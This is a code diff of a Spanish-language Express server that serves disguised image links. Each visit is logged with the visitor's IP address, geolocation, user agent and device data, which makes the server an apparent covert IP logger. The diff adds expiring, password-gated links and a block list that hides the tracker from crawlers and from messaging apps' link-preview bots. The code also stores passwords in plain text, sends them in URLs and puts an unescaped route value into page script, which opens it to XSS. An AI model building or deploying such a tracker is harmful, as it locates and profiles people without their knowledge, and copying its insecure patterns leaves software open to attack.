@@ -11,8 +11,9 @@ app.use(express.static('.'));
 
 const DB_FILE = 'database.json';
 const ALIAS_FILE = 'aliases.json';
+const SECURITY_FILE = 'security.json';
 
-// ============ BASE DE DATOS ============
+// ============ LEER/GUARDAR DATOS ============
 function leerDB() {
     try {
         if (!fs.existsSync(DB_FILE)) {
@@ -27,7 +28,6 @@ function guardarDB(data) {
     fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 }
 
-// ============ ALIASES ============
 function leerAliases() {
     try {
         if (!fs.existsSync(ALIAS_FILE)) {
@@ -42,7 +42,21 @@ function guardarAliases(data) {
     fs.writeFileSync(ALIAS_FILE, JSON.stringify(data, null, 2));
 }
 
-// ============ OBTENER IP REAL ============
+// ============ SEGURIDAD ============
+function leerSeguridad() {
+    try {
+        if (!fs.existsSync(SECURITY_FILE)) {
+            fs.writeFileSync(SECURITY_FILE, JSON.stringify({}));
+            return {};
+        }
+        return JSON.parse(fs.readFileSync(SECURITY_FILE, 'utf8'));
+    } catch { return {}; }
+}
+
+function guardarSeguridad(data) {
+    fs.writeFileSync(SECURITY_FILE, JSON.stringify(data, null, 2));
+}
+
 function getClientIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0] ||
         req.headers['cf-connecting-ip'] ||
@@ -50,7 +64,6 @@ function getClientIP(req) {
         '0.0.0.0';
 }
 
-// ============ GEOLOCALIZACIÓN ============
 async function getGeoLocation(ip) {
     try {
         const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp`);
@@ -79,13 +92,228 @@ async function getGeoLocation(ip) {
 }
 
 // ============================================================
-//  🔥 ENDPOINT PRINCIPAL
+//  🔒 GENERAR CONTRASEÑA ALEATORIA
+// ============================================================
+function generarContrasena() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let pass = '';
+    for (let i = 0; i < 8; i++) {
+        pass += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return pass;
+}
+
+// ============================================================
+//  🔐 ENDPOINT: CREAR ENLACE CON CONTRASEÑA
+// ============================================================
+app.post('/api/secure', (req, res) => {
+    const { rid, contrasena, expiracion } = req.body;
+
+    if (!rid) {
+        return res.status(400).json({ error: 'Falta el RID' });
+    }
+
+    const seguridad = leerSeguridad();
+    const pass = contrasena || generarContrasena();
+    const expira = expiracion || 7;
+
+    const fechaExpiracion = new Date();
+    fechaExpiracion.setDate(fechaExpiracion.getDate() + expira);
+
+    seguridad[rid] = {
+        contrasena: pass,
+        creado: new Date().toISOString(),
+        expiracion: fechaExpiracion.toISOString(),
+        intentos: 0,
+        maxIntentos: 5
+    };
+
+    guardarSeguridad(seguridad);
+
+    res.json({
+        mensaje: '✅ Enlace protegido con contraseña',
+        rid: rid,
+        contrasena: pass,
+        expiracion: fechaExpiracion.toISOString(),
+        dias: expira
+    });
+});
+
+// ============================================================
+//  🔐 VERIFICAR CONTRASEÑA
+// ============================================================
+app.post('/api/verify', (req, res) => {
+    const { rid, contrasena } = req.body;
+
+    if (!rid || !contrasena) {
+        return res.status(400).json({ error: 'Faltan datos' });
+    }
+
+    const seguridad = leerSeguridad();
+    const config = seguridad[rid];
+
+    if (!config) {
+        return res.status(404).json({ error: 'RID no encontrado o no protegido' });
+    }
+
+    if (new Date(config.expiracion) < new Date()) {
+        return res.status(403).json({ error: '❌ El enlace ha expirado' });
+    }
+
+    if (config.intentos >= config.maxIntentos) {
+        return res.status(403).json({ error: '❌ Demasiados intentos fallidos' });
+    }
+
+    if (config.contrasena !== contrasena) {
+        config.intentos++;
+        guardarSeguridad(seguridad);
+        return res.status(401).json({
+            error: '❌ Contraseña incorrecta',
+            intentos_restantes: config.maxIntentos - config.intentos
+        });
+    }
+
+    config.intentos = 0;
+    guardarSeguridad(seguridad);
+
+    res.json({
+        mensaje: '✅ Contraseña correcta',
+        rid: rid
+    });
+});
+
+// ============================================================
+//  🚫 BLOQUEAR BOTS Y RASTREADORES
+// ============================================================
+function esBot(userAgent) {
+    if (!userAgent) return false;
+    const bots = [
+        'bot', 'crawler', 'spider', 'googlebot', 'bingbot',
+        'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
+        'facebookexternalhit', 'twitterbot', 'linkedinbot',
+        'whatsapp', 'telegram', 'discord', 'slack'
+    ];
+    return bots.some(b => userAgent.toLowerCase().includes(b));
+}
+
+// ============================================================
+//  🔥 ENDPOINT PRINCIPAL (CON SEGURIDAD)
 // ============================================================
 app.get('/i/:rid/:nombreImagen', async (req, res) => {
     const { rid, nombreImagen } = req.params;
-    const { device } = req.query;
+    const { device, pass } = req.query;
 
-    // Si el RID es un alias, obtener el RID original
+    // 🚫 BLOQUEAR BOTS
+    const userAgent = req.headers['user-agent'] || '';
+    if (esBot(userAgent)) {
+        return res.status(404).send('Not Found');
+    }
+
+    // 🔒 VERIFICAR SEGURIDAD DEL RID
+    const seguridad = leerSeguridad();
+    const config = seguridad[rid];
+
+    if (config) {
+        if (new Date(config.expiracion) < new Date()) {
+            return res.status(403).send(`
+                <html>
+                    <body style="background:#1a0a2e;display:flex;justify-content:center;align-items:center;height:100vh;color:#f87171;font-family:Arial;text-align:center;">
+                        <div>
+                            <h1>⏰ Enlace expirado</h1>
+                            <p>Este enlace ya no está disponible</p>
+                        </div>
+                    </body>
+                </html>
+            `);
+        }
+
+        if (!pass) {
+            return res.send(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta charset="UTF-8" />
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+                    <title>🔒 Enlace protegido</title>
+                    <style>
+                        * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
+                        body { background:#1a0a2e; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
+                        .container { background:#2d1b4e; padding:40px; border-radius:16px; max-width:400px; width:100%; box-shadow:0 20px 60px rgba(0,0,0,0.7); border:1px solid rgba(180,100,255,0.12); text-align:center; }
+                        h1 { color:#d4b8ff; font-size:24px; margin-bottom:10px; }
+                        p { color:#a890c8; font-size:14px; margin-bottom:20px; }
+                        input { width:100%; padding:12px 16px; background:rgba(255,255,255,0.05); border:1px solid rgba(180,100,255,0.2); border-radius:10px; color:#e2d5f5; font-size:16px; margin-bottom:16px; text-align:center; }
+                        input:focus { outline:none; border-color:#a855f7; box-shadow:0 0 0 3px rgba(168,85,247,0.12); }
+                        button { width:100%; padding:12px; background:linear-gradient(135deg,#7c3aed,#6d28d9); color:white; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:all 0.3s; }
+                        button:hover { transform:translateY(-2px); box-shadow:0 6px 25px rgba(124,58,237,0.4); }
+                        .emoji { font-size:48px; margin-bottom:15px; }
+                        .info { color:#7c6a9e; font-size:12px; margin-top:15px; }
+                        .error { color:#f87171; font-size:13px; margin-top:10px; display:none; }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <div class="emoji">🔒</div>
+                        <h1>Contenido protegido</h1>
+                        <p>Introduce la contraseña para ver la imagen</p>
+                        <form id="formPass">
+                            <input type="password" id="passInput" placeholder="Contraseña..." required autofocus />
+                            <button type="submit">🔓 Ver imagen</button>
+                        </form>
+                        <div class="info">💡 La contraseña te la ha proporcionado quien te envió el enlace</div>
+                        <div class="error" id="errorMsg">❌ Contraseña incorrecta</div>
+                    </div>
+                    <script>
+                        document.getElementById('formPass').addEventListener('submit', function(e) {
+                            e.preventDefault();
+                            const pass = document.getElementById('passInput').value.trim();
+                            const error = document.getElementById('errorMsg');
+                            if (!pass) return;
+
+                            fetch('/api/verify', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ rid: '${rid}', contrasena: pass })
+                            })
+                            .then(r => r.json())
+                            .then(data => {
+                                if (data.error) {
+                                    error.textContent = data.error;
+                                    error.style.display = 'block';
+                                    if (data.intentos_restantes !== undefined) {
+                                        error.textContent += \` (\${data.intentos_restantes} intentos restantes)\`;
+                                    }
+                                } else {
+                                    const urlActual = window.location.href.split('?')[0];
+                                    window.location.href = urlActual + '?pass=' + encodeURIComponent(pass);
+                                }
+                            })
+                            .catch(() => {
+                                error.textContent = '❌ Error al verificar';
+                                error.style.display = 'block';
+                            });
+                        });
+                    </script>
+                </body>
+                </html>
+            `);
+        }
+
+        const configSeg = seguridad[rid];
+        if (configSeg.contrasena !== pass) {
+            return res.status(403).send(`
+                <html>
+                    <body style="background:#1a0a2e;display:flex;justify-content:center;align-items:center;height:100vh;color:#f87171;font-family:Arial;text-align:center;">
+                        <div>
+                            <h1>❌ Contraseña incorrecta</h1>
+                            <p>No tienes permiso para ver esta imagen</p>
+                        </div>
+                    </body>
+                </html>
+            `);
+        }
+    }
+
+    // SI EL RID ES UN ALIAS, OBTENER EL ORIGINAL
     const aliases = leerAliases();
     const ridOriginal = aliases[rid] || rid;
 
@@ -93,14 +321,14 @@ app.get('/i/:rid/:nombreImagen', async (req, res) => {
     try {
         imgUrl = Buffer.from(nombreImagen.split('.')[0], 'base64').toString('utf-8');
     } catch (e) {
-        return res.redirect('https://via.placeholder.com/400x300/1a0a2e/6ee7b7?text=Imagen+no+valida');
+        return res.status(404).send('Not Found');
     }
 
     if (!ridOriginal || !imgUrl) {
-        return res.redirect('https://via.placeholder.com/400x300/1a0a2e/6ee7b7?text=Error');
+        return res.status(404).send('Not Found');
     }
 
-    // ============ REGISTRAR VISITA ============
+    // REGISTRAR VISITA
     try {
         let deviceInfo = {};
         if (device) {
@@ -110,7 +338,6 @@ app.get('/i/:rid/:nombreImagen', async (req, res) => {
         }
 
         const ip = getClientIP(req);
-        const userAgent = req.headers['user-agent'] || 'Desconocido';
         const date = new Date().toISOString().replace('T', ' ').slice(0, 19);
         const geo = await getGeoLocation(ip);
 
@@ -132,7 +359,7 @@ app.get('/i/:rid/:nombreImagen', async (req, res) => {
         console.error('Error registrando visita:', e);
     }
 
-    // ============ REDIRIGIR A LA IMAGEN ============
+    // REDIRIGIR A LA IMAGEN
     if (imgUrl.startsWith('http://') || imgUrl.startsWith('https://')) {
         return res.redirect(imgUrl);
     }
@@ -142,7 +369,7 @@ app.get('/i/:rid/:nombreImagen', async (req, res) => {
         return res.sendFile(imagePath);
     }
 
-    res.redirect('https://via.placeholder.com/400x300/1a0a2e/6ee7b7?text=Imagen+no+encontrada');
+    res.status(404).send('Not Found');
 });
 
 // ============================================================
@@ -151,32 +378,23 @@ app.get('/i/:rid/:nombreImagen', async (req, res) => {
 app.post('/api/alias', (req, res) => {
     const { rid, alias } = req.body;
 
-    console.log(`📝 Recibida petición de renombrar: rid=${rid}, alias=${alias}`);
-
     if (!rid || !alias) {
-        console.log('❌ Faltan parámetros');
         return res.status(400).json({ error: 'Faltan parámetros: rid y alias son obligatorios' });
     }
 
-    // Verificar que el RID existe (tiene registros)
     const db = leerDB();
     if (!db[rid]) {
-        console.log(`❌ El RID ${rid} no existe en la base de datos`);
         return res.status(404).json({ error: `El RID ${rid} no existe o no tiene registros` });
     }
 
-    // Verificar que el alias no esté ya usado por otro RID
     const aliases = leerAliases();
     if (aliases[alias] && aliases[alias] !== rid) {
-        console.log(`❌ El alias '${alias}' ya está en uso por otro RID`);
         return res.status(400).json({ error: `El alias '${alias}' ya está en uso por otro RID` });
     }
 
-    // Guardar el alias
     aliases[alias] = rid;
     guardarAliases(aliases);
 
-    console.log(`✅ Alias '${alias}' creado para el RID '${rid}'`);
     res.json({
         mensaje: `✅ Alias '${alias}' creado para el RID '${rid}'`,
         rid: rid,
@@ -185,59 +403,11 @@ app.post('/api/alias', (req, res) => {
 });
 
 // ============================================================
-//  📋 OBTENER ALIAS DE UN RID
-// ============================================================
-app.get('/api/alias/:rid', (req, res) => {
-    const { rid } = req.params;
-    const aliases = leerAliases();
-
-    const aliasList = [];
-    Object.keys(aliases).forEach(key => {
-        if (aliases[key] === rid) {
-            aliasList.push(key);
-        }
-    });
-
-    res.json({
-        rid: rid,
-        aliases: aliasList
-    });
-});
-
-// ============================================================
-//  📋 OBTENER TODOS LOS ALIASES
-// ============================================================
-app.get('/api/aliases', (req, res) => {
-    const aliases = leerAliases();
-    res.json(aliases);
-});
-
-// ============================================================
-//  🗑️ ELIMINAR ALIAS
-// ============================================================
-app.delete('/api/alias/:alias', (req, res) => {
-    const { alias } = req.params;
-    const aliases = leerAliases();
-
-    if (!aliases[alias]) {
-        return res.status(404).json({ error: `El alias '${alias}' no existe` });
-    }
-
-    delete aliases[alias];
-    guardarAliases(aliases);
-
-    res.json({
-        mensaje: `✅ Alias '${alias}' eliminado correctamente`
-    });
-});
-
-// ============================================================
-//  OBTENER REGISTROS (con soporte para alias)
+//  OBTENER REGISTROS
 // ============================================================
 app.get('/api/records/:rid', (req, res) => {
     let rid = req.params.rid;
 
-    // Verificar si es un alias
     const aliases = leerAliases();
     if (aliases[rid]) {
         rid = aliases[rid];
@@ -259,10 +429,30 @@ app.get('/api/records/:rid', (req, res) => {
 });
 
 // ============================================================
+//  OBTENER INFO DE SEGURIDAD DE UN RID
+// ============================================================
+app.get('/api/security/:rid', (req, res) => {
+    const { rid } = req.params;
+    const seguridad = leerSeguridad();
+    const config = seguridad[rid];
+
+    if (!config) {
+        return res.json({ protegido: false });
+    }
+
+    res.json({
+        protegido: true,
+        expiracion: config.expiracion,
+        dias_restantes: Math.ceil((new Date(config.expiracion) - new Date()) / (1000 * 60 * 60 * 24))
+    });
+});
+
+// ============================================================
 //  INICIAR
 // ============================================================
 app.listen(PORT, () => {
     console.log(`✅ Servidor corriendo en puerto ${PORT}`);
-    console.log(`🟣 Visor - Purple Edition v2.7`);
-    console.log(`📝 Función de renombrar RIDs activada`);
+    console.log(`🟣 Visor - Purple Edition v2.8 (Seguridad)`);
+    console.log(`🔒 Enlaces protegidos con contraseña y expiración`);
+    console.log(`🚫 Bloqueo de bots y rastreadores`);
 });
